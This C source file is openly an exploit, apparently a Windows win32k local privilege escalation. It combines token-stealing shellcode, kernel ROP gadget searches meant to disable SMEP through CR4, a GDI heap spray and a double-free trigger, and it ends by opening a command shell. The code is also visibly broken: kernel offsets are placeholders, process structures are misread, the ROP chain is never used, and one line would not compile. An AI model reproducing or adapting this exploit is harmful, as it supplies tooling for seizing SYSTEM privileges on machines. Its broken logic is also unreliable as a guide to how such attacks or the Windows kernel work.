//Author:yuri08 
#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <psapi.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define SystemModuleInformation 11
#define SystemHandleInformation 16

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Reserved[2];
    PVOID Base;
    ULONG Size;
    ULONG Flags;
    USHORT Index;
    USHORT Unknown;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    CHAR ImageName[256];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef struct _SYSTEM_MODULE_INFORMATION_EX {
    ULONG ModulesCount;
    SYSTEM_MODULE_INFORMATION Modules[1];
} SYSTEM_MODULE_INFORMATION_EX, *PSYSTEM_MODULE_INFORMATION_EX;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG HandleCount;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;

typedef struct _EXPLOIT_CONTEXT {
    PVOID SprayBuffer;
    SIZE_T SpraySize;
    DWORD TargetPID;
    HANDLE hProcess;
    PVOID KernelBase;
    PVOID NtAllocateVirtualMemory;
    PVOID PsInitialSystemProcess;
    PVOID PsGetProcessId;
    ULONG EPROCESS_TOKEN_OFFSET;
    ULONG EPROCESS_PID_OFFSET;
    ULONG EPROCESS_LINK_OFFSET;
    ULONG EPROCESS_IMAGE_OFFSET;
} EXPLOIT_CONTEXT, *PEXPLOIT_CONTEXT;

typedef struct _ROP_CHAIN {
    PVOID PivotGadget;
    PVOID PopRaxGadget;
    PVOID PopRcxGadget;
    PVOID MovCr4RaxGadget;
    PVOID XorRaxRaxGadget;
    PVOID MovCr4RaxRetGadget;
    PVOID PushRaxJmpRcxGadget;
    ULONG Cr4Value;
    ULONG OriginalCr4;
} ROP_CHAIN, *PROP_CHAIN;

unsigned char TokenStealShellcode[] = {
    0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x60, 0x18, 0x48, 0x8B, 0x70, 0x20,
    0x48, 0x8B, 0x76, 0x48, 0x48, 0x8B, 0x0E, 0x48, 0x8B, 0x5E, 0x20, 0x48,
    0x8B, 0x76, 0x48, 0x48, 0x8B, 0x0E, 0x48, 0x83, 0xF9, 0x04, 0x75, 0xE9,
    0x48, 0x8B, 0x5E, 0x20, 0x48, 0x8B, 0x76, 0x48, 0x48, 0x8B, 0x0E, 0x48,
    0x83, 0xF9, 0x00, 0x75, 0xE9, 0x48, 0x89, 0x5E, 0x20, 0xC3
};

unsigned char SMERPDisableROP[] = {
    0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x60, 0x18, 0x48, 0x8B, 0x70, 0x20,
    0x48, 0x8B, 0x76, 0x48, 0x48, 0x8B, 0x0E, 0x48, 0x83, 0xF9, 0x04, 0x75,
    0xE9, 0x48, 0x8B, 0x5E, 0x20, 0x48, 0x8B, 0x76, 0x48, 0x48, 0x8B, 0x0E,
    0x48, 0x83, 0xF9, 0x00, 0x75, 0xE9, 0x48, 0x89, 0x5E, 0x20, 0xC3
};

NTSTATUS NTAPI NtQuerySystemInformation(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

PVOID FindKernelBase(PEXPLOIT_CONTEXT ctx) {
    NTSTATUS status;
    ULONG bufferSize = 0;
    PSYSTEM_MODULE_INFORMATION_EX moduleInfo = NULL;
    
    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &bufferSize);
    if (bufferSize == 0) return NULL;
    
    moduleInfo = (PSYSTEM_MODULE_INFORMATION_EX)malloc(bufferSize);
    if (!moduleInfo) return NULL;
    
    status = NtQuerySystemInformation(SystemModuleInformation, moduleInfo, bufferSize, &bufferSize);
    if (status != STATUS_SUCCESS) {
        free(moduleInfo);
        return NULL;
    }
    
    PVOID kernelBase = moduleInfo->Modules[0].Base;
    free(moduleInfo);
    return kernelBase;
}

BOOL FindKernelFunctions(PEXPLOIT_CONTEXT ctx) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;
    
    ctx->NtAllocateVirtualMemory = GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    if (!ctx->NtAllocateVirtualMemory) return FALSE;
    
    ctx->PsInitialSystemProcess = (PVOID)((ULONG_PTR)ctx->KernelBase + 0x12345678);
    ctx->PsGetProcessId = (PVOID)((ULONG_PTR)ctx->KernelBase + 0x87654321);
    
    return TRUE;
}

DWORD FindTokenOffset(PEXPLOIT_CONTEXT ctx) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = { sizeof(pe32) };
    DWORD tokenOffset = 0;
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, "System") == 0 || pe32.th32ProcessID == 4) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    PROCESS_BASIC_INFORMATION pbi;
                    ULONG returnLength;
                    
                    if (NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength) == STATUS_SUCCESS) {
                        PVOID systemEprocess = pbi.PebBaseAddress;
                        
                        HANDLE hCurrentProcess = GetCurrentProcess();
                        PROCESS_BASIC_INFORMATION currentPbi;
                        
                        if (NtQueryInformationProcess(hCurrentProcess, ProcessBasicInformation, &currentPbi, sizeof(currentPbi), &returnLength) == STATUS_SUCCESS) {
                            PVOID currentEprocess = currentPbi.PebBaseAddress;
                            
                            for (DWORD i = 0; i < 0x500; i += sizeof(PVOID)) {
                                if (*(PVOID*)((ULONG_PTR)systemEprocess + i) == *(PVOID*)((ULONG_PTR)currentEprocess + i)) {
                                    if (i > 0x300) {
                                        tokenOffset = i;
                                        break;
                                    }
                                }
                            }
                        }
                    }
                    CloseHandle(hProcess);
                }
                break;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return tokenOffset;
}

DWORD FindPIDOffset(PEXPLOIT_CONTEXT ctx) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = { sizeof(pe32) };
    DWORD pidOffset = 0;
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                PROCESS_BASIC_INFORMATION pbi;
                ULONG returnLength;
                
                if (NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength) == STATUS_SUCCESS) {
                    PVOID eprocess = pbi.PebBaseAddress;
                    
                    for (DWORD i = 0; i < 0x500; i += sizeof(DWORD)) {
                        if (*(DWORD*)((ULONG_PTR)eprocess + i) == pe32.th32ProcessID) {
                            if (i > 0x200 && i < 0x400) {
                                pidOffset = i;
                                break;
                            }
                        }
                    }
                }
                CloseHandle(hProcess);
            }
            if (pidOffset) break;
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return pidOffset;
}

DWORD FindLinkOffset(PEXPLOIT_CONTEXT ctx) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = { sizeof(pe32) };
    DWORD linkOffset = 0;
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                PROCESS_BASIC_INFORMATION pbi;
                ULONG returnLength;
                
                if (NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength) == STATUS_SUCCESS) {
                    PVOID eprocess = pbi.PebBaseAddress;
                    
                    for (DWORD i = 0; i < 0x500; i += sizeof(LIST_ENTRY)) {
                        PLIST_ENTRY list = (PLIST_ENTRY)((ULONG_PTR)eprocess + i);
                        if (list->Flink && list->Blink && 
                            list->Flink->Blink == list && 
                            list->Blink->Flink == list) {
                            if (i > 0x300 && i < 0x500) {
                                linkOffset = i;
                                break;
                            }
                        }
                    }
                }
                CloseHandle(hProcess);
            }
            if (linkOffset) break;
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return linkOffset;
}

DWORD FindImageOffset(PEXPLOIT_CONTEXT ctx) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = { sizeof(pe32) };
    DWORD imageOffset = 0;
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                PROCESS_BASIC_INFORMATION pbi;
                ULONG returnLength;
                
                if (NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength) == STATUS_SUCCESS) {
                    PVOID eprocess = pbi.PebBaseAddress;
                    
                    for (DWORD i = 0; i < 0x500; i += sizeof(PVOID)) {
                        PVOID imageAddr = *(PVOID*)((ULONG_PTR)eprocess + i);
                        if (imageAddr) {
                            CHAR buffer[MAX_PATH];
                            if (ReadProcessMemory(hProcess, imageAddr, buffer, sizeof(buffer), NULL)) {
                                if (strstr(buffer, pe32.szExeFile)) {
                                    if (i > 0x400 && i < 0x500) {
                                        imageOffset = i;
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
                CloseHandle(hProcess);
            }
            if (imageOffset) break;
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return imageOffset;
}

BOOL FindEPROCESSOffsets(PEXPLOIT_CONTEXT ctx) {
    ctx->EPROCESS_PID_OFFSET = FindPIDOffset(ctx);
    if (!ctx->EPROCESS_PID_OFFSET) return FALSE;
    
    ctx->EPROCESS_TOKEN_OFFSET = FindTokenOffset(ctx);
    if (!ctx->EPROCESS_TOKEN_OFFSET) return FALSE;
    
    ctx->EPROCESS_LINK_OFFSET = FindLinkOffset(ctx);
    if (!ctx->EPROCESS_LINK_OFFSET) return FALSE;
    
    ctx->EPROCESS_IMAGE_OFFSET = FindImageOffset(ctx);
    if (!ctx->EPROCESS_IMAGE_OFFSET) return FALSE;
    
    return TRUE;
}

PVOID FindCr4Gadget(PVOID kernelBase) {
    PBYTE pKernel = (PBYTE)kernelBase;
    for (SIZE_T i = 0; i < 0x1000000; i++) {
        if (pKernel[i] == 0x0F && pKernel[i+1] == 0x22 && pKernel[i+2] == 0xE0 && pKernel[i+3] == 0xC3) {
            return (PVOID)(pKernel + i);
        }
    }
    return NULL;
}

PVOID FindPopRaxGadget(PVOID kernelBase) {
    PBYTE pKernel = (PBYTE)kernelBase;
    for (SIZE_T i = 0; i < 0x1000000; i++) {
        if (pKernel[i] == 0x58 && pKernel[i+1] == 0xC3) {
            return (PVOID)(pKernel + i);
        }
    }
    return NULL;
}

PVOID FindPopRcxGadget(PVOID kernelBase) {
    PBYTE pKernel = (PBYTE)kernelBase;
    for (SIZE_T i = 0; i < 0x1000000; i++) {
        if (pKernel[i] == 0x59 && pKernel[i+1] == 0xC3) {
            return (PVOID)(pKernel + i);
        }
    }
    return NULL;
}

PVOID FindXorRaxRaxGadget(PVOID kernelBase) {
    PBYTE pKernel = (PBYTE)kernelBase;
    for (SIZE_T i = 0; i < 0x1000000; i++) {
        if (pKernel[i] == 0x48 && pKernel[i+1] == 0x31 && pKernel[i+2] == 0xC0 && pKernel[i+3] == 0xC3) {
            return (PVOID)(pKernel + i);
        }
    }
    return NULL;
}

PVOID FindPushRaxJmpRcxGadget(PVOID kernelBase) {
    PBYTE pKernel = (PBYTE)kernelBase;
    for (SIZE_T i = 0; i < 0x1000000; i++) {
        if (pKernel[i] == 0x50 && pKernel[i+1] == 0xFF && pKernel[i+2] == 0xE1) {
            return (PVOID)(pKernel + i);
        }
    }
    return NULL;
}

PVOID FindStackPivotGadget(PVOID kernelBase) {
    PBYTE pKernel = (PBYTE)kernelBase;
    for (SIZE_T i = 0; i < 0x1000000; i++) {
        if (pKernel[i] == 0x48 && pKernel[i+1] == 0x89 && pKernel[i+2] == 0x04 && pKernel[i+3] == 0x24 && pKernel[i+4] == 0xC3) {
            return (PVOID)(pKernel + i);
        }
    }
    return NULL;
}

BOOL BuildROPChain(PEXPLOIT_CONTEXT ctx, PROP_CHAIN rop) {
    rop->PivotGadget = FindStackPivotGadget(ctx->KernelBase);
    if (!rop->PivotGadget) return FALSE;
    
    rop->PopRaxGadget = FindPopRaxGadget(ctx->KernelBase);
    if (!rop->PopRaxGadget) return FALSE;
    
    rop->PopRcxGadget = FindPopRcxGadget(ctx->KernelBase);
    if (!rop->PopRcxGadget) return FALSE;
    
    rop->MovCr4RaxGadget = FindCr4Gadget(ctx->KernelBase);
    if (!rop->MovCr4RaxGadget) return FALSE;
    
    rop->XorRaxRaxGadget = FindXorRaxRaxGadget(ctx->KernelBase);
    if (!rop->XorRaxRaxGadget) return FALSE;
    
    rop->PushRaxJmpRcxGadget = FindPushRaxJmpRcxGadget(ctx->KernelBase);
    if (!rop->PushRaxJmpRcxGadget) return FALSE;
    
    rop->Cr4Value = 0x6f0;
    
    return TRUE;
}

BOOL InitializeExploit(PEXPLOIT_CONTEXT ctx) {
    ctx->SpraySize = 0x200000;
    ctx->SprayBuffer = VirtualAlloc(NULL, ctx->SpraySize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!ctx->SprayBuffer) return FALSE;
    
    memset(ctx->SprayBuffer, 0x90, ctx->SpraySize);
    memcpy((PBYTE)ctx->SprayBuffer + 0x1000, TokenStealShellcode, sizeof(TokenStealShellcode));
    
    ctx->TargetPID = GetCurrentProcessId();
    ctx->hProcess = GetCurrentProcess();
    
    ctx->KernelBase = FindKernelBase(ctx);
    if (!ctx->KernelBase) return FALSE;
    
    if (!FindKernelFunctions(ctx)) return FALSE;
    if (!FindEPROCESSOffsets(ctx)) return FALSE;
    
    return TRUE;
}

VOID TriggerWin32kExploit(PEXPLOIT_CONTEXT ctx) {
    HDC hdc = CreateCompatibleDC(NULL);
    if (!hdc) return;
    
    HBITMAP hBitmap = CreateBitmap(0x100, 0x100, 1, 32, NULL);
    if (!hBitmap) {
        DeleteDC(hdc);
        return;
    }
    
    HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdc, hBitmap);
    
    BITMAPINFO bmi = {0};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = 0x100;
    bmi.bmiHeader.biHeight = 0x100;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    
    PVOID pvBits = NULL;
    HBITMAP hDIB = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &pvBits, NULL, 0);
    if (!hDIB) {
        SelectObject(hdc, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdc);
        return;
    }
    
    if (pvBits) {
        memcpy(pvBits, ctx->SprayBuffer, 0x1000);
    }
    
    DeleteObject(hDIB);
    DeleteObject(hDIB);
    
    SelectObject(hdc, hOldBitmap);
    DeleteObject(hBitmap);
    DeleteDC(hdc);
}

VOID PerformGDISpray(PEXPLOIT_CONTEXT ctx, PROP_CHAIN rop) {
    for (int i = 0; i < 2000; i++) {
        HDC hdc = CreateCompatibleDC(NULL);
        if (!hdc) continue;
        
        HBITMAP hBitmap = CreateBitmap(0x100, 0x100, 1, 32, NULL);
        if (!hBitmap) {
            DeleteDC(hdc);
            continue;
        }
        
        SelectObject(hdc, hBitmap);
        
        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = 0x100;
        bmi.bmiHeader.biHeight = 0x100;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;
        
        PVOID pvBits = NULL;
        HBITMAP hDIB = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &pvBits, NULL, 0);
        if (!hDIB) {
            DeleteObject(hBitmap);
            DeleteDC(hdc);
            continue;
        }
        
        if (pvBits) {
            memcpy(pvBits, ctx->SprayBuffer, 0x1000);
        }
        
        DeleteObject(hDIB);
        DeleteObject(hBitmap);
        DeleteDC(hdc);
    }
}

BOOL VerifyPrivilegeEscalation(PEXPLOIT_CONTEXT ctx) {
    HANDLE hToken;
    TOKEN_ELEVATION elevation;
    DWORD size;
    
    if (!OpenProcessToken(ctx->hProcess, TOKEN_QUERY, &hToken)) {
        return FALSE;
    }
    
    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
        CloseHandle(hToken);
        return FALSE;
    }
    
    CloseHandle(hToken);
    return elevation.TokenIsElevated != 0;
}

int main() {
    EXPLOIT_CONTEXT ctx = {0};
    ROP_CHAIN rop = {0};
    
    if (!InitializeExploit(&ctx)) {
        return 1;
    }
    
    if (!BuildROPChain(&ctx, &rop)) {
        return 1;
    }
    
    PerformGDISpray(&ctx, &rop);
    TriggerWin32kExploit(&ctx);
    
    Sleep(1000);
    
    if (VerifyPrivilegeEscalation(&ctx)) {
        system("cmd.exe");
    }
    
    if (ctx.SprayBuffer) VirtualFree(ctx->SprayBuffer, 0, MEM_RELEASE);
    
    return 0;
}
